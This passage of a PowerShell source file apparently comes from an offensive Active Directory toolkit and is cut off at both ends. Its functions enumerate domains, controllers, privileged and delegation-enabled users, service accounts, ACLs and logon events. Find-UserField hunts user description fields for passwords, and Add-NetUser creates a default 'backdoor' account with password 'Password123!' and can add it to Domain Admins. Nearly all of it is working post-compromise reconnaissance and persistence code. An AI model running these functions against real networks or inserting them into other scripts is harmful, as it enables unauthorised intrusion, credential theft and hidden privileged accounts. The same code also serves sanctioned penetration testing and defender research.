                    $obj = (New-Object System.Security.Principal.SecurityIdentifier($SID2))
                    $obj.Translate( [System.Security.Principal.NTAccount]).Value
                }
            }
        }
        catch {
            # Write-Warning "Invalid SID: $SID"
            $SID
        }
    }
}


function Convert-NT4toCanonical {
    <#
    .SYNOPSIS

        Converts a user/group NT4 name (i.e. dev/john) to canonical format.

        Based on Bill Stewart's code from this article: 
            http://windowsitpro.com/active-directory/translating-active-directory-object-names-between-formats

    .PARAMETER DomainObject

        The user/groupname to convert.

    .PARAMETER Domain

        The domain the the user/group is a part of, defaults to the current domain.

    .EXAMPLE

        PS C:\> Convert-NT4toCanonical -DomainObject "dev\will"
        
        Returns "dev.testlab.local/Users/Will Schroeder"

    .LINK

        http://windowsitpro.com/active-directory/translating-active-directory-object-names-between-formats
    #>
    [CmdletBinding()]
    param(
        [String]
        $DomainObject,

        [String]
        $Domain
    )

    $DomainObject = $DomainObject -replace "/","\"

    if (-not $Domain) {
        $parts = $DomainObject.split("\")
        if($parts.length -eq 1) {
            $Domain = (Get-NetDomain).name
        }
        else {
            $Domain = $parts[0]
        }
    }

    # Accessor functions to simplify calls to NameTranslate
    function Invoke-Method([__ComObject] $object, [String] $method, $parameters) {
        $output = $object.GetType().InvokeMember($method, "InvokeMethod", $NULL, $object, $parameters)
        if ( $output ) { $output }
    }
    function Set-Property([__ComObject] $object, [String] $property, $parameters) {
        [Void] $object.GetType().InvokeMember($property, "SetProperty", $NULL, $object, $parameters)
    }

    $Translate = New-Object -comobject NameTranslate

    try {
        Invoke-Method $Translate "Init" (1, $Domain)
    }
    catch [System.Management.Automation.MethodInvocationException] { 
        Write-Debug "Error with translate init in Convert-NT4toCanonical: $_"
    }

    Set-Property $Translate "ChaseReferral" (0x60)

    try {
        Invoke-Method $Translate "Set" (3, $DomainObject)
        (Invoke-Method $Translate "Get" (2))
    }
    catch [System.Management.Automation.MethodInvocationException] {
        Write-Debug "Error with translate Set/Get in Convert-NT4toCanonical: $_"
    }
}


function Get-Proxy {
<#
    .SYNOPSIS
    
        Enumerates the proxy server and WPAD conents for the current user.

    .EXAMPLE

        PS C:\> Get-Proxy 
        
        Returns the current proxy settings.
#>

    $Reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('CurrentUser', $env:COMPUTERNAME)
    $RegKey = $Reg.OpenSubkey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings")
    $ProxyServer = $RegKey.GetValue('ProxyServer')
    $AutoConfigURL = $RegKey.GetValue('AutoConfigURL')

    if($AutoConfigURL -and ($AutoConfigURL -ne "")) {
        try {
            $Wpad = (New-Object Net.Webclient).downloadstring($AutoConfigURL)
        }
        catch {
            $Wpad = ""
        }
    }
    else {
        $Wpad = ""
    }
    
    if($ProxyServer -or $AutoConfigUrl) {
        $Proxy = New-Object PSObject
        $Proxy | Add-Member Noteproperty 'ProxyServer' $ProxyServer
        $Proxy | Add-Member Noteproperty 'AutoConfigURL' $AutoConfigURL
        $Proxy | Add-Member Noteproperty 'Wpad' $Wpad
        $Proxy
    }
    else {
        Write-Warning "No proxy settings found!"
    }
}


function Get-NameField {
    # function that attempts to extract the appropriate field name
    # from various passed objects. This is so functions can have
    # multiple types of objects passed on the pipeline.
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        $object
    )
    process {
        if($object) {
            if ( [bool]($object.PSobject.Properties.name -match "dnshostname") ) {
                # objects from Get-NetComputer
                $object.dnshostname
            }
            elseif ( [bool]($object.PSobject.Properties.name -match "name") ) {
                # objects from Get-NetDomainController
                $object.name
            }
            else {
                # strings and catch alls
                $object
            }
        }
        else {
            return $Null
        }
    }
}


########################################################
#
# Domain info functions below.
#
########################################################

function Get-DomainSearcher {
<#
    .SYNOPSIS

        Helper used by various functions that takes an ADSpath and
        domain specifier and builds the correct ADSI searcher object.

    .PARAMETER Domain

        The domain to use for the query, defaults to the current domain.

    .PARAMETER DomainController

        Domain controller to reflect queries through.

    .PARAMETER ADSpath

        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.

    .PARAMETER ADSprefix

        Prefix to set for the searcher (like "CN=Sites,CN=Configuration")

    .EXAMPLE

        PS C:\> Get-DomainSearcher -Domain testlab.local

    .EXAMPLE

        PS C:\> Get-DomainSearcher -Domain testlab.local -DomainController SECONDARY.dev.testlab.local
#>

    [CmdletBinding()]
    param(
        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [String]
        $ADSprefix
    )

    # if we have an custom adspath specified, use that for the query
    # useful for OU queries
    if($ADSpath) {
        if(!$ADSpath.startswith("LDAP://")) {
            $ADSpath = "LDAP://$ADSpath"
        }
        Write-Verbose "Get-DomainSearcher using ADSI search: $ADSpath"
        $DomainSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"$ADSpath")
    }

    # if a domain is specified, try to grab that domain
    elseif ($Domain) {

        # if we're reflecting our LDAP queries through a particular domain controller
        if(!$DomainController) {
            try {
                $DomainController = ((Get-NetDomain).PdcRoleOwner).Name
            }
            catch {
                Write-Warning "Error in retrieving PDC for current domain in Get-DomainSearcher: $_"
            }
        }

        try {
            # reference - http://blogs.msdn.com/b/javaller/archive/2013/07/29/searching-across-active-directory-domains-in-powershell.aspx
            $DN = "DC=$($Domain.Replace('.', ',DC='))"

            if ($DomainController) {
                # if we can grab the primary DC for the current domain, use that for the query
                if($ADSprefix) {
                    Write-Verbose "Get-DomainSearcher using ADSI search: LDAP://$DomainController/$ADSprefix,$DN"
                    $DomainSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$DomainController/$ADSprefix,$DN")
                }
                else {
                    Write-Verbose "Get-DomainSearcher using ADSI search: LDAP://$DomainController/$DN"
                    $DomainSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$DomainController/$DN")
                }
            }
            else {
                # otherwise try to connect to the DC for the target domain
                if($ADSprefix) {
                    Write-Verbose "Get-DomainSearcher using ADSI search: LDAP://$DomainController/$ADSprefix,$DN"
                    $DomainSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$ADSprefix,$DN")
                }
                else {
                    Write-Verbose "Get-DomainSearcher using ADSI search: LDAP://$DN"
                    $DomainSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$DN")
                }
            }
        }
        catch {
            Write-Warning "The specified domain $Domain does not exist, could not be contacted, or there isn't an existing trust. Error: $_"
            return
        }
    }

    else {
        # if a domain isn't specified, use the current domain
        $Domain = (Get-NetDomain).name
        $DN = "DC=$($Domain.Replace('.', ',DC='))"

        if($DomainController) {
            # if we're reflecting through a particular DC
            if($ADSprefix) {
                Write-Verbose "Get-DomainSearcher using ADSI search: LDAP://$DomainController/$ADSprefix,$DN"
                $DomainSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$DomainController/$ADSprefix,$DN")
            }
            else {
                Write-Verbose "Get-DomainSearcher using ADSI search: LDAP://$DomainController/$DN"
                $DomainSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$DomainController/$DN")
            }
        }
        elseif($ADSprefix) {
            # if we're giving a particular ADS prefix
            Write-Verbose "Get-DomainSearcher using ADSI search: LDAP://$ADSprefix,$DN"
            $DomainSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$ADSprefix,$DN")
        }
        else {
            Write-Verbose "Get-DomainSearcher using ADSI search: LDAP://$DN"
            $DomainSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$DN")
        }
    }

    return $DomainSearcher
}


function Get-NetDomain {
<#
    .SYNOPSIS

        Returns the name of the current user's domain.

    .PARAMETER Domain

        The domain to query for, defaults to the current domain.

    .EXAMPLE

        PS C:\> Get-NetDomain -Domain testlab.local

    .LINK

        http://social.technet.microsoft.com/Forums/scriptcenter/en-US/0c5b3f83-e528-4d49-92a4-dee31f4b481c/finding-the-dn-of-the-the-domain-without-admodule-in-powershell?forum=ITCG
#>

    [CmdletBinding()]
    param(
        [String]
        $Domain
    )

    if($Domain -and ($Domain -ne "")) {
        $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain)
        try {
            [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
        }
        catch {
            Write-Warning "The specified domain $Domain does not exist, could not be contacted, or there isn't an existing trust."
            $Null
        }
    }
    else {
        [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    }
}


function Get-NetForest {
<#
    .SYNOPSIS

        Returns the forest specified, or the current forest
        associated with this domain,

    .PARAMETER Forest

        The forest to query for. If not supplied, the
        current forest is used.

    .EXAMPLE
    
        PS C:\> Get-NetForest -Forest external.domain
#>

    [CmdletBinding()]
    param(
        [String]
        $Forest
    )

    if($Forest) {
        # if a forest is specified, try to grab that forest
        $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $Forest)
        try {
            [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
        }
        catch {
            Write-Warning "The specified forest $Forest does not exist, could not be contacted, or there isn't an existing trust."
            $Null
        }
    }
    else {
        # otherwise use the current forest
        [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
    }
}


function Get-NetForestDomain {
<#
    .SYNOPSIS

        Return all domains for the current forest.

    .PARAMETER Forest

        Return domains for the specified forest.

    .PARAMETER Domain

        Return domains that match this term/wildcard.

    .EXAMPLE

        PS C:\> Get-NetForestDomain

    .EXAMPLE

        PS C:\> Get-NetForestDomain -Forest external.local
#>

    [CmdletBinding()]
    param(
        [String]
        $Domain,

        [String]
        $Forest
    )

    if($Domain) {
        # try to detect a wild card so we use -like
        if($Domain.Contains('*')) {
            (Get-NetForest -Forest $Forest).Domains | Where-Object {$_.Name -like $Domain}
        }
        else {
            # match the exact domain name if there's not a wildcard
            (Get-NetForest -Forest $Forest).Domains | Where-Object {$_.Name.ToLower() -eq $Domain.ToLower()}
        }
    }
    else {
        # return all domains
        (Get-NetForest -Forest $Forest).Domains
    }
}


function Get-NetDomainController {
<#
    .SYNOPSIS

        Return the current domain controllers for the active domain.

    .PARAMETER Domain

        The domain to query for domain controllers, defaults to the current domain.

    .EXAMPLE

        PS C:\> Get-NetDomainController -Domain test
#>

    [CmdletBinding()]
    param(
        [String]
        $Domain
    )

    (Get-NetDomain -Domain $Domain).DomainControllers
}


########################################################
#
# "net *" replacements and other fun start below
#
########################################################

function Get-NetUser {
<#
    .SYNOPSIS

        Query information for a given user or users in the domain.

    .DESCRIPTION

        This function users [ADSI] and LDAP to query the current
        domain for all users. Another domain can be specified to
        query for users across a trust.
        This is a replacement for "net users /domain"

    .PARAMETER UserName

        Username filter string, wildcards accepted.

    .PARAMETER Domain

        The domain to query for users, defaults to the current domain.

    .PARAMETER DomainController

        Domain controller to reflect queries through.

    .PARAMETER ADSpath

        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.

    .PARAMETER Filter

        A customized ldap filter string to use, e.g. "(description=*admin*)"

    .PARAMETER AdminCount

        Switch. Return users with adminCount=1.

    .PARAMETER SPN

        Switch. Only return user objects with non-null service principal names.

    .PARAMETER Unconstrained

        Switch. Return users that have unconstrained delegation.

    .PARAMETER AllowDelegation

        Switch. Return user accounts that are not marked as 'sensitive and not allowed for delegation'

    .EXAMPLE

        PS C:\> Get-NetUser -Domain testing

    .EXAMPLE

        PS C:\> Get-NetUser -ADSpath "LDAP://OU=secret,DC=testlab,DC=local"
#>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $UserName,

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [String]
        $Filter,

        [Switch]
        $SPN,

        [Switch]
        $AdminCount,

        [Switch]
        $Unconstrained,

        [Switch]
        $AllowDelegation
    )
    begin {
        # so this isn't repeated if users are passed on the pipeline
        $UserSearcher = Get-DomainSearcher -Domain $Domain -ADSpath $ADSpath -DomainController $DomainController
    }
    process {
        if($UserSearcher) {

            # if we're checking for unconstrained delegation
            if($Unconstrained) {
                Write-Verbose "Checking for unconstrained delegation"
                $Filter += "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
            }
            if($AllowDelegation) {
                Write-Verbose "Checking for users who can be delegated"
                # negation of "Accounts that are sensitive and not trusted for delegation"
                $Filter += "(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))"
            }
            if($AdminCount) {
                Write-Verbose "Checking for adminCount=1"
                $Filter += "(admincount=1)"
            }

            # check if we're using a username filter or not
            if($UserName) {
                # samAccountType=805306368 indicates user objects
                $UserSearcher.filter="(&(samAccountType=805306368)(samAccountName=$UserName)$Filter)"
            }
            elseif ($SPN) {
                $UserSearcher.filter="(&(samAccountType=805306368)(servicePrincipalName=*)$Filter)"
            }
            else {
                # filter is something like "(samAccountName=*blah*)" if specified
                $UserSearcher.filter="(&(samAccountType=805306368)$Filter)"
            }
            $UserSearcher.PageSize = 200
            $UserSearcher.FindAll() | Where-Object {$_} | ForEach-Object {
                # for each user/member, do a quick adsi object grab
                $Properties = $_.Properties
                $UserObject = New-Object PSObject
                $Properties.PropertyNames | ForEach-Object {
                    if ($_ -eq "objectsid") {
                        # convert the SID to a string
                        $UserObject | Add-Member Noteproperty $_ ((New-Object System.Security.Principal.SecurityIdentifier($Properties[$_][0],0)).Value)
                    }
                    elseif($_ -eq "objectguid") {
                        # convert the GUID to a string
                        $UserObject | Add-Member Noteproperty $_ (New-Object Guid (,$Properties[$_][0])).Guid
                    }
                    elseif( ($_ -eq "lastlogon") -or ($_ -eq "lastlogontimestamp") -or ($_ -eq "pwdlastset") ) {
                        # convert time stamps
                        $UserObject | Add-Member Noteproperty $_ ([datetime]::FromFileTime(($Properties[$_][0])))
                    }
                    else {
                        if ($Properties[$_].count -eq 1) {
                            $UserObject | Add-Member Noteproperty $_ $Properties[$_][0]
                        }
                        else {
                            $UserObject | Add-Member Noteproperty $_ $Properties[$_]
                        }
                    }
                }
                $UserObject
            }
        }
    }
}


function Add-NetUser {
<#
    .SYNOPSIS

        Adds a local or domain user.

    .DESCRIPTION

        This function utilizes DirectoryServices.AccountManagement to add a
        user to the local machine or a domain (if permissions allow). It will
        default to adding to the local machine. An optional group name to
        add the user to can be specified.

    .PARAMETER UserName

        The username to add. If not given, it defaults to "backdoor"

    .PARAMETER Password

        The password to set for the added user. If not given, it defaults to "Password123!"

    .PARAMETER GroupName

        Group to optionally add the user to.

    .PARAMETER HostName

        Host to add the local user to, defaults to 'localhost'

    .PARAMETER Domain

        Specified domain to add the user to.

    .EXAMPLE

        PS C:\> Add-NetUser -UserName john -Password password
        
        Adds a localuser "john" to the machine with password "password"

    .EXAMPLE

        PS C:\> Add-NetUser -UserName john -Password password -GroupName "Domain Admins" -domain ''
        
        Adds the user "john" with password "password" to the current domain and adds
        the user to the domain group "Domain Admins"

    .EXAMPLE

        PS C:\> Add-NetUser -UserName john -Password password -GroupName "Domain Admins" -domain 'testing'
        
        Adds the user "john" with password "password" to the 'testing' domain and adds
        the user to the domain group "Domain Admins"

    .Link

        http://blogs.technet.com/b/heyscriptingguy/archive/2010/11/23/use-powershell-to-create-local-user-accounts.aspx
#>

    [CmdletBinding()]
    Param (
        [String]
        $UserName = 'backdoor',

        [String]
        $Password = 'Password123!',

        [String]
        $GroupName,

        [String]
        $HostName = 'localhost',

        [String]
        $Domain
    )

    if ($Domain) {

        $DomainObject = Get-NetDomain -Domain $Domain
        if(-not $DomainObject) {
            return $Null
        }

        # add the assembly we need
        Add-Type -AssemblyName System.DirectoryServices.AccountManagement

        # http://richardspowershellblog.wordpress.com/2008/05/25/system-directoryservices-accountmanagement/
        # get the domain context
        $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList [System.DirectoryServices.AccountManagement.ContextType]::Domain, $DomainObject

        # create the user object
        $User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList $context

        # set user properties
        $User.Name = $UserName
        $User.SamAccountName = $UserName
        $User.PasswordNotRequired = $False
        $User.SetPassword($Password)
        $User.Enabled = $True

        try {
            # commit the user
            $User.Save()
            "[*] User $UserName successfully created in domain $Domain"
        }
        catch {
            Write-Warning '[!] User already exists!'
            return
        }
    }
    else {
        # if it's not a domain add, it's a local machine add
        $ObjOu = [ADSI]"WinNT://$HostName"
        $ObjUser = $ObjOu.Create('User', $UserName)
        $ObjUser.SetPassword($Password)

        # commit the changes to the local machine
        try {
            $Null = $ObjUser.SetInfo()
            "[*] User $UserName successfully created on host $HostName"
        }
        catch {
            Write-Warning '[!] Account already exists!'
        }
    }

    # if a group is specified, invoke Add-NetGroupUser and return its value
    if ($GroupName) {
        # if we're adding the user to a domain
        if ($Domain) {
            Add-NetGroupUser -UserName $UserName -GroupName $GroupName -Domain $Domain
            "[*] User $UserName successfully added to group $GroupName in domain $Domain"
        }
        # otherwise, we're adding to a local group
        else {
            Add-NetGroupUser -UserName $UserName -GroupName $GroupName -HostName $HostName
            "[*] User $UserName successfully added to group $GroupName on host $HostName"
        }
    }
}


function Add-NetGroupUser {
<#
    .SYNOPSIS

        Adds a local or domain user to a local or domain group.

    .PARAMETER UserName

        The domain username to query for.

    .PARAMETER GroupName

        Group to add the user to.

    .PARAMETER Domain

        Domain to add the user to.

    .PARAMETER HostName

        Hostname to add the user to, defaults to localhost.

    .EXAMPLE

        PS C:\> Add-NetGroupUser -UserName john -GroupName Administrators
        
        Adds a localuser "john" to the local group "Administrators"

    .EXAMPLE

        PS C:\> Add-NetGroupUser -UserName john -GroupName "Domain Admins" -Domain dev.local
        
        Adds the existing user "john" to the domain group "Domain Admins" in "dev.local"
#>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $True)]
        [String]
        $UserName,

        [Parameter(Mandatory = $True)]
        [String]
        $GroupName,

        [String]
        $Domain,

        [String]
        $HostName = 'localhost'
    )

    # add the assembly if we need it
    Add-Type -AssemblyName System.DirectoryServices.AccountManagement

    # if we're adding to a remote host, use the WinNT provider
    if($HostName -ne 'localhost') {
        try {
            ([ADSI]"WinNT://$HostName/$GroupName,group").add("WinNT://$HostName/$UserName,user")
            "[*] User $UserName successfully added to group $GroupName on $HostName"
        }
        catch {
            Write-Warning "[!] Error adding user $UserName to group $GroupName on $HostName"
            return
        }
    }

    # otherwise it's a local or domain add
    else {
        if ($Domain) {
            $CT = [System.DirectoryServices.AccountManagement.ContextType]::Domain
            $DomainObject = Get-NetDomain -Domain $Domain
            if(-not $DomainObject) {
                return $Null
            }
        }
        else {
            # otherwise, get the local machine context
            $CT = [System.DirectoryServices.AccountManagement.ContextType]::Machine
        }

        # get the full principal context
        $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList $CT, $DomainObject

        # find the particular group
        $Group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($Context,$GroupName)

        # add the particular user to the group
        $Group.Members.add($Context, [System.DirectoryServices.AccountManagement.IdentityType]::SamAccountName, $UserName)

        # commit the changes
        try {
            $Group.Save()
        }
        catch {
            "Error $UserName to $GroupName : $_"
        }
    }
}


function Get-UserProperty {
<#
    .SYNOPSIS

        Returns a list of all user object properties. If a property
        name is specified, it returns all [user:property] values.

        Taken directly from @obscuresec's post:
            http://obscuresecurity.blogspot.com/2014/04/ADSISearcher.html

    .DESCRIPTION

        This function a list of all user object properties, optionally
        returning all the user:property combinations if a property
        name is specified.

    .PARAMETER Domain

        The domain to query for user properties, defaults to the current domain.

    .PARAMETER DomainController

        Domain controller to reflect queries through.

    .PARAMETER Properties

        Return property names for users.

    .EXAMPLE

        PS C:\> Get-UserProperty -Domain testing
        
        Returns all user properties for users in the 'testing' domain.

    .EXAMPLE

        PS C:\> Get-UserProperty -Properties ssn,lastlogon,location
        
        Returns all an array of user/ssn/lastlogin/location combinations
        for users in the current domain.

    .LINK

        http://obscuresecurity.blogspot.com/2014/04/ADSISearcher.html
#>

    [CmdletBinding()]
    param(
        [String]
        $Domain,
        
        [String]
        $DomainController,

        [String[]]
        $Properties
    )

    if($Properties) {
        # extract out the set of all properties for each object
        Get-NetUser -Domain $Domain -DomainController $DomainController | ForEach-Object {

            $User = New-Object PSObject
            $User | Add-Member Noteproperty 'Name' $_.name

            if($Properties -isnot [system.array]) {
                $Properties = @($Properties)
            }
            ForEach($Property in $Properties) {
                try {
                    $User | Add-Member Noteproperty $Property $_.$Property
                }
                catch {
                    Write-Debug "Error acessing property $Property : $_"
                }
            }
            $User
        }
    }
    else {
        # extract out just the property names
        Get-NetUser -Domain $Domain -DomainController $DomainController | Select-Object -First 1 | Get-Member -MemberType *Property | Select-Object -Property 'Name'
    }
}


function Find-UserField {
<#
    .SYNOPSIS

        Searches user object fields for a given word (default *pass*). Default
        field being searched is 'description'.

        Taken directly from @obscuresec's post:
            http://obscuresecurity.blogspot.com/2014/04/ADSISearcher.html

    .DESCRIPTION

        This function queries all users in the domain with Get-NetUser,
        extracts all the specified field(s) and searches for a given
        term, default "*pass*". Case is ignored.

    .PARAMETER Term

        Term to search for, default of "pass".

    .PARAMETER Field

        User field to search in, default of "description".

    .PARAMETER Domain

        Domain to search computer fields for, defaults to the current domain.

    .EXAMPLE

        PS C:\> Find-UserField

        Find user accounts with "pass" in the description.

    .EXAMPLE

        PS C:\> Find-UserField -Field info -Term backup

        Find user accounts with "backup" in the "info" field.
#>

    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [String]
        $Term = 'pass',

        [String]
        $Field = 'description',

        [String]
        $Domain
    )

    process {
        Get-NetUser -Domain $Domain -Filter "($Field=*$Term*)" | ForEach-Object {
            $UserField = New-Object PSObject
            $UserField | Add-Member Noteproperty 'User' $_.samaccountname
            $UserField | Add-Member Noteproperty $Field $_.$Field
            $UserField
        }
    }
}


function Get-UserEvent {
<#
    .SYNOPSIS

        Dump and parse security events relating to an account logon (ID 4624)
        or a TGT request event (ID 4768).

        Author: @sixdub

    .DESCRIPTION

        Provides information about all users who have logged on and where they
        logged on from. Intended to be used and tested on
        Windows 2008 Domain Controllers.
        Admin Reqd? YES

    .PARAMETER ComputerName

        The computer to get events from. Default: Localhost

    .PARAMETER EventType

        Either 'logon', 'tgt', or 'all'. Defaults: 'logon'

    .PARAMETER DateStart

        Filter out all events before this date. Default: 5 days
   
    .EXAMPLE

        PS C:\> Get-UserEvent -ComputerName DomainController.testlab.local

    .LINK

        http://www.sixdub.net/2014/11/07/offensive-event-parsing-bringing-home-trophies/
#>

    Param(
        [String]
        $ComputerName=$env:computername,

        [String]
        [ValidateSet("login","tgt","all")]
        $EventType = "logon",

        [DateTime]
        $DateStart=[DateTime]::Today.AddDays(-5)
    )


    if($EventType.ToLower() -like "logon") {
        [Int32[]]$ID = @(4624)
    }
    elseif($EventType.ToLower() -like "tgt") {
        [Int32[]]$ID = @(4768)
    }
    else {
        [Int32[]]$ID = @(4624, 4768)
    }

    #grab all events matching our filter for the specified host
    Get-WinEvent -ComputerName $ComputerName -FilterHashTable @{ LogName = 'Security'; ID=$ID; StartTime=$DateStart} -ErrorAction SilentlyContinue | ForEach-Object {

        if($ID -contains 4624) {    
            # first parse and check the logon type. This could be later adapted and tested for RDP logons (type 10)
            if($_.message -match '(?s)(?<=Logon Type:).*?(?=(Impersonation Level:|New Logon:))') {
                if($Matches) {
                    $LogonType = $Matches[0].trim()
                    $Matches = $Null
                }
            }
            else {
                $LogonType = ""
            }

            # interactive logons or domain logons
            if (($LogonType -eq 2) -or ($LogonType -eq 3)) {
                try {
                    # parse and store the account used and the address they came from
                    if($_.message -match '(?s)(?<=New Logon:).*?(?=Process Information:)') {
                        if($Matches) {
                            $UserName = $Matches[0].split("`n")[2].split(":")[1].trim()
                            $Domain = $Matches[0].split("`n")[3].split(":")[1].trim()
                            $Matches = $Null
                        }
                    }
                    if($_.message -match '(?s)(?<=Network Information:).*?(?=Source Port:)') {
                        if($Matches) {
                            $Address = $Matches[0].split("`n")[2].split(":")[1].trim()
                            $Matches = $Null
                        }
                    }

                    # only add if there was account information not for a machine or anonymous logon
                    if ($UserName -and (-not $UserName.endsWith('$')) -and ($UserName -ne 'ANONYMOUS LOGON'))
                    {
                        $LogonEvent = New-Object PSObject
                        $LogonEvent | Add-Member NoteProperty 'Domain' $Domain
                        $LogonEvent | Add-Member NoteProperty 'ComputerName' $ComputerName
                        $LogonEvent | Add-Member NoteProperty 'Username' $UserName
                        $LogonEvent | Add-Member NoteProperty 'Address' $Address
                        $LogonEvent | Add-Member NoteProperty 'ID' '4624'
                        $LogonEvent | Add-Member NoteProperty 'LogonType' $LogonType
                        $LogonEvent | Add-Member NoteProperty 'Time' $_.TimeCreated
                        $LogonEvent
                    }
                }
                catch {
                    Write-Debug "Error parsing event logs: $_"
                }
            }
        }
        if($ID -contains 4768) {
            try {
                if($_.message -match '(?s)(?<=Account Information:).*?(?=Service Information:)') {
                    if($Matches) {
                        $Username = $Matches[0].split("`n")[1].split(":")[1].trim()
                        $Domain = $Matches[0].split("`n")[2].split(":")[1].trim()
                        $Matches = $Null
                    }
                }

                if($_.message -match '(?s)(?<=Network Information:).*?(?=Additional Information:)') {
                    if($Matches) {
                        $Address = $Matches[0].split("`n")[1].split(":")[-1].trim()
                        $Matches = $Null
                    }
                }

                $LogonEvent = New-Object PSObject
                $LogonEvent | Add-Member NoteProperty 'Domain' $Domain
                $LogonEvent | Add-Member NoteProperty 'ComputerName' $ComputerName
                $LogonEvent | Add-Member NoteProperty 'Username' $Username
                $LogonEvent | Add-Member NoteProperty 'Address' $Address
                $LogonEvent | Add-Member NoteProperty 'ID' '4768'
                $LogonEvent | Add-Member NoteProperty 'LogonType' ''
                $LogonEvent | Add-Member NoteProperty 'Time' $_.TimeCreated
                $LogonEvent
            }
            catch {
                Write-Debug "Error parsing event logs: $_"
            }
        }
    }
}


function Get-ObjectAcl {
<#
    .SYNOPSIS
        Returns the ACLs associated with a specific active directory object.

        Thanks Sean Metacalf (@pyrotek3) for the idea and guidance.

    .PARAMETER SamAccountName

        Object name to filter for.        

    .PARAMETER Name

        Object name to filter for.

    .PARAMETER DN

        Object distinguished name to filter for.

    .PARAMETER ResolveGUIDs

        Switch. Resolve GUIDs to their display names.

    .PARAMETER Filter

        A customized ldap filter string to use, e.g. "(description=*admin*)"
     
    .PARAMETER Domain

        The domain to use for the query, defaults to the current domain.

    .PARAMETER DomainController

        Domain controller to reflect queries through.

    .PARAMETER ADSpath

        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.

    .EXAMPLE

        PS C:\> Get-ObjectAcl -ObjectSamAccountName matt.admin -domain testlab.local
        
        Get the ACLs for the matt.admin user in the testlab.local domain

    .EXAMPLE

        PS C:\> Get-ObjectAcl -ObjectSamAccountName matt.admin -domain testlab.local -ResolveGUIDs
        
        Get the ACLs for the matt.admin user in the testlab.local domain and
        resolve relevant GUIDs to their display names.
#>

    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $SamAccountName,

        [String]
        $Name = "*",

        [String]
        $DN = "*",

        [Switch]
        $ResolveGUIDs,

        [String]
        $Filter,

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath
    )

    begin {
        $Searcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath

        # get a GUID -> name mapping
        if($ResolveGUIDs) {
            $GUIDs = Get-GUIDMap -Domain $Domain -DomainController $DomainController
        }
    }
    process {

        if ($Searcher) {

            if($ObjectSamAccountName) {
                $Searcher.filter="(&(samaccountname=$SamAccountName)(name=$Name)(distinguishedname=$DN)$Filter)"  
            }
            else {
                $Searcher.filter="(&(name=$Name)(distinguishedname=$DN)$Filter)"  
            }
  
            $Searcher.PageSize = 200
            
            try {
                $Searcher.FindAll() | Foreach-Object {
                    $Object = [adsi]($_.path)
                    $Access = $Object.PsBase.ObjectSecurity.access
                    # add in the object DN to the output object
                    $Access | Add-Member NoteProperty 'ObjectDN' ($_.properties.distinguishedname[0])
                    $Access
                } | Foreach-Object {
                    if($GUIDs) {
                        # if we're resolving GUIDs, map them them to the resolved hash table
                        $Acl = New-Object PSObject
                        $_.psobject.properties | ForEach-Object {
                            if( ($_.Name -eq 'ObjectType') -or ($_.Name -eq 'InheritedObjectType') ) {
                                try {
                                    $Acl | Add-Member Noteproperty $_.Name $GUIDS[$_.Value.toString()]
                                }
                                catch {
                                    $Acl | Add-Member Noteproperty $_.Name $_.Value
                                }
                            }
                            else {
                                $Acl | Add-Member Noteproperty $_.Name $_.Value
                            }
                        }
                        $Acl
                    }
                    else { $_ }
                }
            }
            catch {
                Write-Warning $_
            }
        }
    }
}


function Get-GUIDMap {
<#
    .SYNOPSIS

        Helper to build a hash table of [GUID] -> resolved names

        Heavily adapted from http://blogs.technet.com/b/ashleymcglone/archive/2013/03/25/active-directory-ou-permissions-report-free-powershell-script-download.aspx

    .PARAMETER Domain
    
        The domain to use for the query, defaults to the current domain.

    .PARAMETER DomainController
    
        Domain controller to reflect queries through.

    .LINK

        http://blogs.technet.com/b/ashleymcglone/archive/2013/03/25/active-directory-ou-permissions-report-free-powershell-script-download.aspx
#>

    [CmdletBinding()]
    Param (
        [String]
        $Domain,

        [String]
        $DomainController
    )

    $GUIDs = @{'00000000-0000-0000-0000-000000000000' = 'All'}

    $Searcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSprefix "CN=Extended-Rights,CN=Configuration"

    if ($Searcher) {
        $Searcher.filter = "(objectClass=controlAccessRight)"
        $Searcher.PageSize = 200
        try {
